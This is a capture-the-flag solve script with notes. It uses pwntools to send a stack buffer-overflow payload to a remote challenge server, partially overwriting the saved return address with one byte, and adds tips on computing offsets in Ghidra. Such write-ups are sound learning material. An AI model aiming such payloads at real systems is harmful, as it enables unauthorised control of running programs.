""" Solution

    The main goal of this challenge was to overwrite the buffer and write over the last byte of rip to point to the function that you wanted to return to
    """

""" Post Mortem

    Make sure to watch out for sizes in decimal vs hex, they can be sneaky
    You don't have to overwrite the entire 8 bytes of a stack item, you can always just write a few bytes to jump to a close address
    Ghidra can tell you the offset between your variable and the frame pointer, just look at the number value in the default variable name, subtract your rbp size from that, and thats how much you need to overwrite to get to the frame pointer. This is because of how ghidra calculates offsets, its calculates the base before rbp is even pushed to the stack
    """

from pwn import *
from time import sleep

HOST = '94.237.53.113'
PORT = 54291

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#proc = process('./sp_going_deeper')
proc = remote(HOST, PORT)

proc.sendlineafter(b'>>', b'2')

buff_offset = b'A' * 40

payload = b''.join([
  buff_offset,
  b'A'*8, # garbage data
  b'A'*8, # rbp
  p8(0x12), # overwrite last byte of rip
])
proc.sendlineafter(b'Username: ', payload)
print(proc.recvline())
print(proc.recvline())
print(proc.recvline())
print(proc.recvline())
